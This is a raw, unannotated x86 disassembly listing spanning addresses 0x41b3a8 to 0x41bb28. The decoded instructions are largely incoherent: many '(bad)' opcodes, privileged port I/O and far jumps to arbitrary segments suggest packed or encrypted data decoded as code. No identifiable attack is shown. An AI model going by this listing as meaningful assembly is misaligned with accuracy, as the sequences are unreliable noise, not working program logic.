  41b3a8:	pusha  
  41b3a9:	sbb    eax,0xd23c8170
  41b3ae:	push   0xffffffb3
  41b3b0:	into   
  41b3b1:	enter  0xae44,0x3e
  41b3b5:	mov    bh,0x10
  41b3b7:	xor    edi,DWORD PTR [ecx-0x724f1ec]
  41b3bd:	inc    edi
  41b3be:	jp     0x41b363
  41b3c0:	jbe    0x41b37a
  41b3c2:	out    dx,al
  41b3c3:	xchg   ebp,eax
  41b3c4:	in     eax,dx
  41b3c5:	(bad)  
  41b3c6:	xchg   esp,eax
  41b3c7:	dec    eax
  41b3c8:	sub    BYTE PTR [edx-0x9],ah
  41b3cb:	cmp    eax,0xc0ea2770
  41b3d0:	mov    edx,0xbe3a8151
  41b3d5:	jmp    0x41b401
  41b3d7:	inc    ebp
  41b3d8:	push   edx
  41b3d9:	jp     0x41b393
  41b3db:	daa    
  41b3dc:	and    BYTE PTR ds:0x4aa11be2,bl
  41b3e2:	sbb    al,0x2c
  41b3e4:	lea    edx,[ecx+0x28]
  41b3e7:	jmp    0x41b42f
  41b3e9:	inc    eax
  41b3ea:	lods   al,BYTE PTR ds:[esi]
  41b3eb:	stos   BYTE PTR es:[edi],al
  41b3ec:	jb     0x41b3c0
  41b3ee:	jnp    0x41b3cf
  41b3f0:	stos   DWORD PTR es:[edi],eax
  41b3f1:	(bad)  
  41b3f2:	mul    DWORD PTR [eax+0x7141a3a1]
  41b3f8:	jno    0x41b3c3
  41b3fa:	jne    0x41b47a
  41b3fc:	and    eax,DWORD PTR [edi-0xcdab94]
  41b402:	adc    DWORD PTR [esi+0x7ac10637],0xffffff82
  41b409:	and    DWORD PTR [eax-0x4a],edi
  41b40c:	ja     0x41b394
  41b40e:	mov    ecx,0x34e8320a
  41b413:	cmp    al,0x5c
  41b415:	mov    edx,0x88918610
  41b41a:	sbb    ch,BYTE PTR [edi+0x46f0316d]
  41b420:	pop    ebx
  41b421:	adc    al,0x91
  41b423:	jbe    0x41b433
  41b425:	test   DWORD PTR [edx+ebx*2+0x1814eb4d],0x3835e94b
  41b430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b431:	sbb    edi,ecx
  41b433:	aam    0x1d
  41b435:	out    dx,al
  41b436:	push   es
  41b437:	dec    esp
  41b438:	scas   al,BYTE PTR es:[edi]
  41b439:	pop    ecx
  41b43a:	rcl    DWORD PTR [ecx],1
  41b43c:	adc    DWORD PTR [ebp-0x3d354ba6],esi
  41b442:	ss scas al,BYTE PTR es:[edi]
  41b444:	mov    ah,0xa2
  41b446:	mov    ds,WORD PTR [ebp+0x6f5ac095]
  41b44c:	push   es
  41b44d:	jle    0x41b4aa
  41b44f:	shl    DWORD PTR [ebp+0x6b],1
  41b452:	test   eax,0x4a27e894
  41b457:	bnd jnp 0x41b424
  41b45a:	aad    0xc1
  41b45c:	jnp    0x41b400
  41b45e:	cmp    BYTE PTR [esp+ecx*2],ah
  41b461:	sbb    DWORD PTR [esi+eiz*4],0xffffffc5
  41b465:	cld    
  41b466:	adc    BYTE PTR [edi-0x47e84684],dh
  41b46c:	jns    0x41b3f3
  41b46e:	sbb    al,0x5a
  41b470:	mov    ds:0x2bf8c6ca,eax
  41b475:	add    bl,BYTE PTR [eax]
  41b477:	mov    al,0x67
  41b479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b47a:	aam    0xdd
  41b47c:	imul   ebp,DWORD PTR [edi+0x58],0xffffff8a
  41b480:	rcr    BYTE PTR [edi],0x2
  41b483:	dec    edi
  41b484:	push   cs
  41b485:	pop    ecx
  41b486:	lods   eax,DWORD PTR ds:[esi]
  41b487:	jnp    0x41b4f4
  41b489:	rcr    edi,1
  41b48b:	popa   
  41b48c:	ror    DWORD PTR [ebx+0xe38454e],0x5a
  41b493:	sbb    al,0xe3
  41b495:	push   0xd3b2b2f1
  41b49a:	add    DWORD PTR [ecx+ebp*4-0x6d7ae475],0x7a
  41b4a2:	rcr    DWORD PTR [edi-0x2810b9b6],cl
  41b4a8:	test   al,al
  41b4aa:	icebp  
  41b4ab:	add    bh,BYTE PTR [edi-0x4d]
  41b4ae:	neg    DWORD PTR [ecx]
  41b4b0:	pop    ebx
  41b4b1:	ds inc esp
  41b4b3:	sti    
  41b4b4:	push   eax
  41b4b5:	cmp    eax,0xfbe11f1
  41b4ba:	push   eax
  41b4bb:	or     cl,BYTE PTR [ebx-0x5d]
  41b4be:	addr16 out dx,eax
  41b4c0:	aad    0xb1
  41b4c2:	fwait
  41b4c3:	loopne 0x41b51e
  41b4c5:	test   eax,0x83145aa8
  41b4ca:	dec    ebx
  41b4cb:	(bad)  
  41b4cc:	leave  
  41b4cd:	or     eax,0x66bf04cf
  41b4d2:	cmp    DWORD PTR [ebx-0x59],edx
  41b4d5:	out    dx,al
  41b4d6:	xor    DWORD PTR es:[esi+0x63],edi
  41b4da:	mov    ss,eax
  41b4dc:	and    DWORD PTR [ecx-0x4ff76ec],ebx
  41b4e2:	out    dx,eax
  41b4e3:	xor    bh,BYTE PTR [eax]
  41b4e5:	cmc    
  41b4e6:	inc    ecx
  41b4e7:	into   
  41b4e8:	jge    0x41b4a6
  41b4ea:	push   esi
  41b4eb:	loopne 0x41b56c
  41b4ed:	pusha  
  41b4ee:	sub    al,0xcb
  41b4f0:	call   0x80ac:0xc5ff5ce8
  41b4f7:	imul   ebx,eax,0x937adf54
  41b4fd:	mov    cl,0xbb
  41b4ff:	dec    esi
  41b500:	and    BYTE PTR [edx+0x2c0b8006],0x24
  41b507:	icebp  
  41b508:	mov    esp,0xe4977680
  41b50d:	mov    esp,0x823b8f1
  41b512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b513:	in     eax,0xc3
  41b515:	and    bh,BYTE PTR [ebp+ebx*8-0x5a]
  41b519:	loope  0x41b4d3
  41b51b:	sub    al,0xb4
  41b51d:	jmp    0x41b522
  41b51f:	push   eax
  41b520:	jo     0x41b550
  41b522:	mov    ch,0xbe
  41b524:	lea    edx,[edx+0x4de8c58a]
  41b52a:	rcl    dh,cl
  41b52c:	push   ecx
  41b52d:	sbb    eax,ebp
  41b52f:	aas    
  41b530:	clc    
  41b531:	scas   eax,DWORD PTR es:[edi]
  41b532:	and    DWORD PTR [eax],edi
  41b534:	and    DWORD PTR [esi+0xd],ecx
  41b537:	mov    dl,0xa5
  41b539:	xchg   ebx,eax
  41b53a:	inc    ecx
  41b53b:	pop    ebx
  41b53c:	mov    cs:0x2e5dcd6a,al
  41b542:	(bad)  
  41b544:	(bad)  
  41b545:	fisttp WORD PTR [eax+esi*4+0x6da5818b]
  41b54c:	xor    DWORD PTR [edi],ebx
  41b54e:	fisub  DWORD PTR [esi]
  41b550:	dec    ecx
  41b551:	push   eax
  41b552:	cdq    
  41b553:	lea    ebp,[eax+0x6a]
  41b556:	scas   ax,WORD PTR es:[edi]
  41b558:	jbe    0x41b530
  41b55a:	stos   DWORD PTR es:[edi],eax
  41b55b:	cs jmp 0xac3d:0x13be575
  41b563:	add    al,0x55
  41b565:	ins    DWORD PTR es:[edi],dx
  41b566:	mov    ebp,0xef602acb
  41b56b:	ret    0x6082
  41b56e:	les    esp,FWORD PTR [esi]
  41b570:	jmp    0xfc2b121d
  41b575:	adc    DWORD PTR [eax],ebp
  41b577:	mov    ds:0x41018851,al
  41b57c:	jmp    0x41b5d7
  41b57e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41b580:	adc    DWORD PTR [edx-0x4e],ecx
  41b583:	push   ecx
  41b584:	inc    edx
  41b585:	frstor [esi]
  41b587:	xor    esi,DWORD PTR [edi+0x16]
  41b58a:	dec    edi
  41b58b:	cdq    
  41b58c:	sbb    al,0xf4
  41b58e:	and    esp,DWORD PTR [eax]
  41b590:	and    DWORD PTR [ebx+edx*4+0x570c74f6],edx
  41b597:	ror    al,1
  41b599:	in     eax,dx
  41b59a:	gs cli 
  41b59c:	(bad)  
  41b59e:	nop
  41b59f:	out    dx,al
  41b5a0:	fdivr  DWORD PTR [ebp-0x20105bf]
  41b5a6:	shr    DWORD PTR [esi+0x73b69f2d],1
  41b5ac:	xor    edi,DWORD PTR [eax+0x4713165d]
  41b5b2:	test   eax,0x95f94fd7
  41b5b7:	adc    DWORD PTR [ebx-0x2d],ebx
  41b5ba:	icebp  
  41b5bb:	xor    ebx,DWORD PTR [ebx-0x6c]
  41b5be:	inc    ebx
  41b5bf:	retf   0x40a6
  41b5c2:	jmp    0xd6df:0xff985b5
  41b5c9:	lahf   
  41b5ca:	arpl   WORD PTR [edx],si
  41b5cc:	mov    dh,0xd2
  41b5ce:	(bad)  
  41b5cf:	jmp    FWORD PTR [ecx-0x4]
  41b5d2:	daa    
  41b5d3:	sbb    BYTE PTR [ebx],bh
  41b5d5:	test   dl,0xad
  41b5d8:	cs sub al,0x78
  41b5db:	pop    ecx
  41b5dc:	je     0x41b610
  41b5de:	outs   dx,BYTE PTR ds:[esi]
  41b5df:	jmp    0x41b571
  41b5e1:	rol    BYTE PTR [esi-0x28],0xaf
  41b5e5:	xchg   esp,eax
  41b5e6:	imul   ebx,DWORD PTR [ebp-0x4246e758],0xffffffaa
  41b5ed:	fild   WORD PTR [eax-0x71]
  41b5f0:	shl    BYTE PTR [eax+0xa],cl
  41b5f3:	mov    BYTE PTR [ecx+eiz*2+0x3bff8f36],cl
  41b5fa:	aam    0xe9
  41b5fc:	jns    0x41b5e7
  41b5fe:	call   0x233:0x9008c512
  41b605:	mov    ah,BYTE PTR [edi]
  41b607:	call   0x9d48:0x411d5370
  41b60e:	aas    
  41b60f:	pop    ds
  41b610:	daa    
  41b611:	scas   al,BYTE PTR es:[edi]
  41b612:	or     al,0x77
  41b614:	pop    ds
  41b615:	inc    edx
  41b616:	mov    gs,WORD PTR [esi-0x7f26bf60]
  41b61c:	mov    al,0x7d
  41b61e:	in     al,0x8c
  41b620:	xchg   esi,eax
  41b621:	add    BYTE PTR [ecx],cl
  41b623:	inc    edi
  41b624:	das    
  41b625:	es dec esp
  41b627:	or     al,0xb2
  41b629:	xor    ecx,DWORD PTR [ebx-0x41dfa92d]
  41b62f:	xchg   esi,eax
  41b630:	or     eax,0xb5d33b74
  41b635:	(bad)  [eax+ebx*1-0x35]
  41b639:	xor    eax,0xb71cd7ac
  41b63e:	stc    
  41b63f:	mov    esp,DWORD PTR [di+0x2bf4]
  41b644:	std    
  41b645:	aad    0x11
  41b647:	daa    
  41b648:	into   
  41b649:	sub    bl,BYTE PTR gs:[ecx+0x26c5ba7c]
  41b650:	lock cmp bl,bh
  41b653:	jb     0x41b68c
  41b655:	(bad)  
  41b656:	lock mov eax,ds:0x827ab9f6
  41b65c:	sbb    al,BYTE PTR [eax]
  41b65e:	add    DWORD PTR [esi-0x3a68c5ef],esi
  41b664:	xchg   DWORD PTR [edi+eiz*2],esi
  41b667:	in     eax,0xd1
  41b669:	and    DWORD PTR [eax+0x36b143af],0x52
  41b670:	inc    ebp
  41b671:	int    0x4d
  41b673:	std    
  41b674:	jge    0x41b65c
  41b676:	imul   ebx,DWORD PTR [ebp-0x1f],0x34
  41b67a:	enter  0x70ac,0xc4
  41b67e:	xor    DWORD PTR ds:0x82d545b8,ebx
  41b684:	cmc    
  41b685:	jo     0x41b6c7
  41b687:	rcl    dh,1
  41b689:	loope  0x41b6af
  41b68b:	(bad)  
  41b68c:	pop    eax
  41b68d:	mov    ds:0x110c9811,eax
  41b692:	mov    cl,0x94
  41b694:	cmp    DWORD PTR [edi+0x3bc3646e],ebx
  41b69a:	mov    edx,0x46000c56
  41b69f:	adc    bh,BYTE PTR [ebx]
  41b6a1:	adc    al,0x2f
  41b6a3:	lods   eax,DWORD PTR ds:[esi]
  41b6a4:	lods   eax,DWORD PTR ds:[esi]
  41b6a5:	ja     0x41b711
  41b6a7:	xor    eax,0x6ef238bd
  41b6ac:	enter  0x2fe8,0x38
  41b6b0:	or     al,BYTE PTR [eax]
  41b6b2:	sbb    DWORD PTR [ebx],edx
  41b6b4:	dec    ebp
  41b6b5:	sub    DWORD PTR ds:[esi],edx
  41b6b8:	test   BYTE PTR [edi-0x2f],dh
  41b6bb:	fimul  WORD PTR [ebx-0x6c]
  41b6be:	inc    esi
  41b6bf:	mov    dh,0x6f
  41b6c1:	xor    ecx,DWORD PTR [eax+esi*2-0x1e]
  41b6c5:	add    dh,BYTE PTR [esi+0x7a]
  41b6c8:	mov    esp,0xd8f871ab
  41b6cd:	imul   eax,edi,0x5f
  41b6d0:	push   cs
  41b6d1:	lahf   
  41b6d2:	les    edi,FWORD PTR [esp+eiz*4]
  41b6d5:	mov    bl,0x1f
  41b6d7:	adc    ebp,ebp
  41b6d9:	mov    dl,0xc
  41b6db:	push   ebx
  41b6dc:	in     eax,0x6f
  41b6de:	or     edx,ebx
  41b6e0:	cmp    BYTE PTR [edx],ch
  41b6e2:	into   
  41b6e3:	pop    esp
  41b6e4:	mov    edi,0x17773c3d
  41b6e9:	dec    esp
  41b6ea:	push   ebx
  41b6eb:	(bad)  
  41b6ed:	sbb    BYTE PTR [edi],cl
  41b6ef:	push   ss
  41b6f0:	jecxz  0x41b6c5
  41b6f2:	(bad)  
  41b6f3:	mov    ebp,0xb9e70733
  41b6f8:	popf   
  41b6f9:	push   eax
  41b6fa:	rep lods al,BYTE PTR ds:[esi]
  41b6fc:	outs   dx,BYTE PTR ds:[esi]
  41b6fd:	cmp    ch,BYTE PTR [ebp+0x1f8fa3e3]
  41b703:	sbb    eax,0x724d844f
  41b708:	sbb    bl,bh
  41b70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b70b:	in     eax,dx
  41b70c:	jo     0x41b773
  41b70e:	mov    ebx,DWORD PTR [esi-0x62893bab]
  41b714:	jmp    0x41b6fd
  41b716:	mov    ds,WORD PTR [eax+0x6f]
  41b719:	pop    esi
  41b71b:	mov    ah,0xba
  41b71d:	lods   eax,DWORD PTR ds:[esi]
  41b71e:	xchg   esp,eax
  41b71f:	lods   al,BYTE PTR ds:[esi]
  41b720:	call   0x9e3f:0x47a47b13
  41b727:	arpl   WORD PTR [esi],dx
  41b729:	xchg   edx,eax
  41b72a:	adc    BYTE PTR [ebp+0xf],0x90
  41b72e:	mov    esi,DWORD PTR [edi]
  41b730:	sub    DWORD PTR [edi],edi
  41b732:	fmulp  st(4),st
  41b734:	adc    eax,0x211ce4ef
  41b739:	arpl   WORD PTR [edi+0x72],bp
  41b73c:	sub    al,0x22
  41b73f:	jmp    0xbd94bb03
  41b744:	or     eax,0x64d656d5
  41b749:	outs   dx,DWORD PTR ds:[esi]
  41b74a:	clc    
  41b74b:	ret    
  41b74c:	ja     0x41b6d8
  41b74e:	scas   eax,DWORD PTR es:[edi]
  41b74f:	sub    al,0x63
  41b751:	mov    esp,0xc51d4712
  41b756:	dec    ebp
  41b757:	out    dx,eax
  41b758:	xor    eax,0xf8b14d84
  41b75d:	retf   
  41b75e:	ins    DWORD PTR es:[edi],dx
  41b75f:	fs in  eax,0xe4
  41b762:	call   0xa7d0:0x6f367b1a
  41b769:	icebp  
  41b76a:	and    al,0xb4
  41b76c:	daa    
  41b76d:	cmp    BYTE PTR [eax+esi*8-0x5e],cl
  41b771:	adc    ah,BYTE PTR [ebp-0x27c0e5fc]
  41b777:	xor    eax,0x20cf625c
  41b77c:	aad    0x50
  41b77e:	and    al,0x89
  41b780:	in     al,dx
  41b781:	cs mov dh,0xd0
  41b784:	gs es std 
  41b787:	fwait
  41b788:	stos   BYTE PTR es:[edi],al
  41b789:	fsincos 
  41b78b:	clc    
  41b78c:	jecxz  0x41b779
  41b78e:	das    
  41b78f:	fmul   QWORD PTR [ebp+0x65]
  41b792:	iret   
  41b793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b794:	sbb    al,0xc6
  41b796:	xchg   ebp,eax
  41b797:	fsubr  DWORD PTR [eax+edx*8]
  41b79a:	mov    edx,0xbd0ab869
  41b79f:	push   edx
  41b7a0:	imul   ebp,DWORD PTR [esp+ecx*8+0x4a],0x18cd2d33
  41b7a8:	sbb    edi,DWORD PTR [ebx+eax*4+0x6cc4912a]
  41b7af:	sbb    BYTE PTR [ebx+0x669f7a8f],dh
  41b7b5:	push   0xffffffb3
  41b7b7:	mov    eax,0x5e7e4a64
  41b7bc:	fwait
  41b7bd:	call   DWORD PTR [eax+0x5c]
  41b7c0:	push   ecx
  41b7c1:	int    0xbd
  41b7c3:	mov    eax,ds:0x9907f2d8
  41b7c8:	data16 fdiv DWORD PTR [ebx+0x62cd8011]
  41b7cf:	dec    ebx
  41b7d0:	and    ebp,eax
  41b7d2:	fiadd  WORD PTR ds:0xe86ace12
  41b7d8:	adc    eax,0xffffff88
  41b7db:	repnz das 
  41b7dd:	rol    DWORD PTR [esi-0x3b],cl
  41b7e0:	call   0x8e3a4216
  41b7e5:	iret   
  41b7e6:	pop    ss
  41b7e7:	mov    eax,0x4011f148
  41b7ec:	sub    eax,0x1a732b7d
  41b7f1:	sbb    DWORD PTR [esi+0x5f82f9b5],0x6b
  41b7f8:	iret   
  41b7f9:	mov    ch,ch
  41b7fb:	mov    ah,0x13
  41b7fd:	push   cs
  41b7fe:	les    eax,FWORD PTR ds:0x72309c5c
  41b804:	fistp  QWORD PTR ds:0xb90d5d03
  41b80a:	fst    QWORD PTR [ebp-0x8df8dcb]
  41b810:	sub    esp,edi
  41b812:	mov    eax,ds:0x5688aafe
  41b817:	call   0xecad92cd
  41b81c:	imul   dl
  41b81e:	mov    ?,ebx
  41b820:	bound  esp,QWORD PTR [ecx-0x1]
  41b823:	popa   
  41b824:	lods   al,BYTE PTR ds:[esi]
  41b825:	xchg   esi,eax
  41b826:	jle    0x41b820
  41b828:	std    
  41b829:	mov    ds:0x2f1c5e99,eax
  41b82e:	or     DWORD PTR ds:0xf44ac36f,0x58f878cf
  41b838:	les    ecx,FWORD PTR [ebx]
  41b83a:	jns    0x41b86f
  41b83c:	cmp    dl,ch
  41b83e:	loopne 0x41b85a
  41b840:	or     al,cl
  41b842:	popf   
  41b843:	repnz (bad) 
  41b845:	(bad)  [edx]
  41b847:	sub    dh,BYTE PTR [edx]
  41b849:	test   eax,0xe94b137d
  41b84e:	into   
  41b84f:	xchg   ebx,eax
  41b850:	aad    0xc9
  41b852:	call   0xf668:0x3a296a78
  41b859:	sub    al,0x88
  41b85b:	dec    ebp
  41b85c:	fisttp WORD PTR [eax-0x9]
  41b85f:	push   ecx
  41b860:	cmp    bl,BYTE PTR [esi]
  41b862:	jae    0x41b866
  41b864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b865:	popa   
  41b866:	cmp    al,0x87
  41b868:	mov    ds:0xc9032c59,eax
  41b86d:	jecxz  0x41b85b
  41b86f:	sub    DWORD PTR [ebx],esp
  41b871:	test   eax,0xda835954
  41b876:	cdq    
  41b877:	pop    eax
  41b878:	test   al,0x55
  41b87a:	jne    0x41b833
  41b87c:	mov    dl,BYTE PTR [esi+0x1e]
  41b87f:	pop    edi
  41b880:	lods   eax,DWORD PTR ds:[esi]
  41b881:	mov    WORD PTR [ecx-0x7585a1d7],?
  41b887:	or     al,0xd0
  41b889:	mov    edi,0x8cacb6f0
  41b88e:	xor    BYTE PTR es:[ecx],ch
  41b891:	fld    st(2)
  41b893:	rcl    DWORD PTR [ebp-0x43280723],1
  41b899:	sub    al,0x4c
  41b89b:	inc    edx
  41b89c:	pop    ss
  41b89d:	and    esi,ebx
  41b89f:	sar    DWORD PTR [edi-0x4a953baf],1
  41b8a5:	fisub  DWORD PTR [eax]
  41b8a7:	cwde   
  41b8a8:	fs xor esi,edi
  41b8ab:	rcr    DWORD PTR [ecx-0x1378af24],cl
  41b8b1:	pop    ebp
  41b8b2:	push   ds
  41b8b3:	daa    
  41b8b4:	and    eax,0xe8bf728
  41b8b9:	outs   dx,DWORD PTR ds:[esi]
  41b8ba:	sub    al,0x20
  41b8bc:	mov    ds:0x80f56497,al
  41b8c1:	fadd   DWORD PTR [ebp-0x51]
  41b8c4:	and    ch,ah
  41b8c6:	mov    ds,WORD PTR [esi]
  41b8c8:	cmp    dh,bh
  41b8ca:	pop    ebp
  41b8cb:	add    eax,0x73e153cb
  41b8d0:	js     0x41b914
  41b8d2:	and    BYTE PTR [ebp+0x24],cl
  41b8d5:	xlat   BYTE PTR ds:[ebx]
  41b8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8d7:	sbb    ecx,DWORD PTR [esi+eax*2+0x6b13e712]
  41b8de:	xchg   BYTE PTR [ebx-0x72],ah
  41b8e1:	sub    esi,DWORD PTR [edi-0x19]
  41b8e4:	cmp    al,0x67
  41b8e6:	lock cmp eax,0xe2e3d9c4
  41b8ec:	mov    cl,0x23
  41b8ee:	hlt    
  41b8ef:	call   0x9821:0xb4967f12
  41b8f6:	add    al,0xe9
  41b8f8:	lahf   
  41b8f9:	(bad)  
  41b8fa:	and    al,BYTE PTR ds:0x17b3d52b
  41b900:	fs loop 0x41b965
  41b903:	or     al,0x48
  41b905:	xchg   ebp,eax
  41b906:	adc    BYTE PTR [edx],dh
  41b908:	or     eax,0x30758d6b
  41b90d:	inc    ebx
  41b90e:	xchg   ebp,eax
  41b90f:	cmp    al,0xe6
  41b911:	jle    0x41b8bf
  41b913:	les    esi,FWORD PTR [ebp-0x13]
  41b916:	pushf  
  41b917:	mul    DWORD PTR ds:0x43bae22c
  41b91d:	xlat   BYTE PTR ds:[ebx]
  41b91e:	int    0x69
  41b920:	mov    edx,0xe06c24e5
  41b925:	sbb    al,0x69
  41b927:	adc    al,cl
  41b929:	mov    DWORD PTR [esi-0x60],eax
  41b92c:	xchg   DWORD PTR [edi-0x41dd8c38],ecx
  41b932:	mov    eax,ds:0x592e3586
  41b937:	call   0x5c0fd3ce
  41b93c:	(bad)  
  41b93d:	call   0x5b34:0x20d23461
  41b944:	jl     0x41b98e
  41b946:	scas   al,BYTE PTR es:[edi]
  41b947:	in     eax,dx
  41b948:	mov    eax,ds:0xe0fa4f21
  41b94d:	adc    edi,DWORD PTR [esi+edx*1+0x3dd74db6]
  41b954:	cli    
  41b955:	(bad)  
  41b956:	cli    
  41b957:	gs jmp 0xa75cfbad
  41b95d:	shl    BYTE PTR [edi],0x9c
  41b960:	push   esp
  41b961:	jp     0x41b944
  41b963:	push   esi
  41b964:	xor    eax,0xaa6567d6
  41b969:	jmp    0x41b956
  41b96b:	jae    0x41b948
  41b96d:	fstp   TBYTE PTR [esi+0x22]
  41b970:	cmp    eax,0x5df78478
  41b975:	add    eax,DWORD PTR [ebp+0x6d2af9f0]
  41b97b:	add    DWORD PTR [ecx+esi*2],ebx
  41b97e:	or     al,0x4f
  41b980:	sub    esi,esi
  41b982:	and    al,0x97
  41b984:	xor    edx,ecx
  41b986:	push   cs
  41b987:	mov    eax,ds:0x91c4a416
  41b98c:	ja     0x41b93b
  41b98e:	fcmovbe st,st(4)
  41b990:	push   ds
  41b991:	in     eax,0x47
  41b993:	pop    esp
  41b994:	(bad)  
  41b998:	mul    BYTE PTR [ebp+eax*2-0x54]
  41b99c:	and    eax,0x27bcf6dd
  41b9a1:	mov    ecx,0x73b93b1e
  41b9a6:	xor    ch,BYTE PTR [ecx]
  41b9a8:	cmp    BYTE PTR [eax+0x34],0x4b
  41b9ac:	push   ecx
  41b9ad:	test   edi,esp
  41b9af:	mov    ebx,0x3d367e7b
  41b9b4:	dec    edx
  41b9b5:	addr16 pop ebp
  41b9b7:	pop    esi
  41b9b8:	addr16 enter 0x6051,0x8a
  41b9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9be:	sub    dl,BYTE PTR [edx+eiz*4+0x5f]
  41b9c2:	xchg   edi,eax
  41b9c3:	arpl   WORD PTR [edx],bx
  41b9c5:	test   DWORD PTR [edx+0x4b965ff0],edx
  41b9cb:	push   edi
  41b9cc:	gs jns 0x41b984
  41b9cf:	outs   dx,DWORD PTR ds:[esi]
  41b9d0:	and    al,0xe3
  41b9d2:	neg    esp
  41b9d4:	jne    0x41ba22
  41b9d6:	inc    eax
  41b9d7:	add    ebp,DWORD PTR [eax]
  41b9d9:	jmp    0x41ba0d
  41b9db:	mov    fs,WORD PTR [esi]
  41b9dd:	jmp    0x41b965
  41b9df:	in     eax,dx
  41b9e0:	sahf   
  41b9e1:	or     esi,DWORD PTR [esi]
  41b9e3:	and    al,0x9a
  41b9e5:	daa    
  41b9e6:	loopne 0x41b97c
  41b9e8:	outs   dx,BYTE PTR ds:[esi]
  41b9e9:	popa   
  41b9ea:	sar    cl,cl
  41b9ec:	aam    0xee
  41b9ee:	pop    esp
  41b9ef:	inc    esp
  41b9f0:	retf   0x8504
  41b9f3:	mov    ch,0xb
  41b9f5:	ins    BYTE PTR es:[edi],dx
  41b9f6:	cmp    bh,BYTE PTR [edx+0x93c82fe]
  41b9fc:	adc    dl,BYTE PTR [ebx+0x3e]
  41b9ff:	adc    eax,0x3167bcc1
  41ba04:	mov    WORD PTR [edx],fs
  41ba06:	pusha  
  41ba07:	sub    al,0xd3
  41ba09:	ror    ch,0x1f
  41ba0c:	fsubr  QWORD PTR [edi+esi*2-0x25]
  41ba10:	in     al,dx
  41ba11:	xchg   BYTE PTR [eax-0x72],bh
  41ba14:	pop    edx
  41ba15:	dec    eax
  41ba16:	xchg   edx,eax
  41ba17:	hlt    
  41ba18:	dec    edi
  41ba19:	add    BYTE PTR [esi],dh
  41ba1b:	shl    BYTE PTR [edi],cl
  41ba1d:	and    DWORD PTR [edi],ebp
  41ba1f:	jecxz  0x41b9bb
  41ba21:	jge    0x41b9cc
  41ba23:	arpl   WORD PTR [esi+0x4ddea893],si
  41ba29:	pop    esp
  41ba2a:	sbb    eax,0xa952528b
  41ba2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba30:	js     0x41ba38
  41ba32:	xor    esp,DWORD PTR [ebx+0xe]
  41ba35:	mov    ch,0x68
  41ba37:	or     BYTE PTR [esi+eax*2+0x23],0xa2
  41ba3c:	(bad)  [esp+esi*2+0x283d3e9a]
  41ba43:	pop    ecx
  41ba44:	or     esi,DWORD PTR [ecx-0x53071fd5]
  41ba4a:	cmp    DWORD PTR [edx+0x1d],ebp
  41ba4d:	xor    al,0x6e
  41ba4f:	or     al,0xa7
  41ba51:	out    0x90,al
  41ba53:	push   ecx
  41ba54:	adc    cl,BYTE PTR [edx-0x596ee0d1]
  41ba5a:	out    dx,eax
  41ba5b:	fidivr DWORD PTR [ebx+edx*8-0x775afe1b]
  41ba62:	dec    ecx
  41ba63:	enter  0xff20,0xf4
  41ba67:	push   0xffffffb8
  41ba69:	(bad)  
  41ba6a:	fwait
  41ba6b:	das    
  41ba6c:	xlat   BYTE PTR ds:[ebx]
  41ba6d:	add    ch,BYTE PTR [edi+0x30fb0191]
  41ba73:	enter  0x37e7,0x18
  41ba77:	and    ah,BYTE PTR [ebx+0x2c197fc3]
  41ba7d:	and    eax,0x6497839d
  41ba82:	fwait
  41ba83:	sub    BYTE PTR [edi+0x1e043744],bl
  41ba89:	out    0x91,al
  41ba8b:	xor    BYTE PTR [edx+0x32eae125],0xfd
  41ba92:	add    bh,bh
  41ba94:	add    eax,0x45f05cd9
  41ba99:	xchg   ebp,eax
  41ba9a:	mov    ecx,0x77a7286f
  41ba9f:	ja     0x41ba64
  41baa1:	dec    eax
  41baa2:	cmc    
  41baa3:	or     eax,0xac5d36d7
  41baa8:	jbe    0x41bafb
  41baaa:	in     eax,dx
  41baab:	cmp    ah,BYTE PTR [ebx+edx*8+0x77]
  41baaf:	fld    QWORD PTR [edx-0xaa39b64]
  41bab5:	ins    DWORD PTR es:[edi],dx
  41bab6:	pusha  
  41bab7:	cld    
  41bab8:	popa   
  41bab9:	push   ebx
  41baba:	ins    DWORD PTR es:[edi],dx
  41babb:	or     al,0xf1
  41babd:	jmp    0x41ba6c
  41babf:	xor    cl,cl
  41bac1:	pop    edx
  41bac2:	xor    BYTE PTR [ecx],cl
  41bac4:	mov    ds:0x9b1152e0,al
  41bac9:	out    0x9b,eax
  41bacb:	and    edi,ebx
  41bacd:	inc    ebp
  41bace:	fdiv   st(4),st
  41bad0:	mov    edi,0x3116f5fb
  41bad5:	sar    DWORD PTR [eax+0x46],0x2f
  41bad9:	pop    ss
  41bada:	mov    esi,0x3303bc24
  41badf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bae0:	cld    
  41bae1:	mov    DWORD PTR [ebx],0xae518774
  41bae7:	pop    esi
  41bae8:	pop    ebx
  41bae9:	or     edx,DWORD PTR [esi-0x61659f9a]
  41baef:	iret   
  41baf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baf1:	ins    DWORD PTR es:[edi],dx
  41baf2:	mov    ch,BYTE PTR [esi]
  41baf4:	lods   eax,DWORD PTR ds:[esi]
  41baf5:	fisubr DWORD PTR [edx+0x6b]
  41baf8:	and    BYTE PTR [ebx+0x3e747b1a],ch
  41bafe:	and    al,0xf1
  41bb00:	or     al,0x5e
  41bb02:	ja     0x41babd
  41bb04:	inc    esp
  41bb05:	mov    eax,0x2bbc2f01
  41bb0a:	dec    eax
  41bb0b:	jnp    0x41bb47
  41bb0d:	aaa    
  41bb0e:	pop    edx
  41bb0f:	loope  0x41bb77
  41bb11:	popa   
  41bb12:	into   
  41bb13:	or     edx,DWORD PTR [edx-0x2f]
  41bb16:	pop    ss
  41bb17:	push   0x43
  41bb19:	ficom  WORD PTR [edx]
  41bb1b:	es int3 
  41bb1d:	jmp    0x2981eb66
  41bb22:	lods   eax,DWORD PTR ds:[esi]
  41bb23:	adc    al,0xb6
  41bb25:	(bad)  
  41bb26:	adc    al,0x4b
  41bb28:	sub    DWORD PTR [ebp-0x47],esi
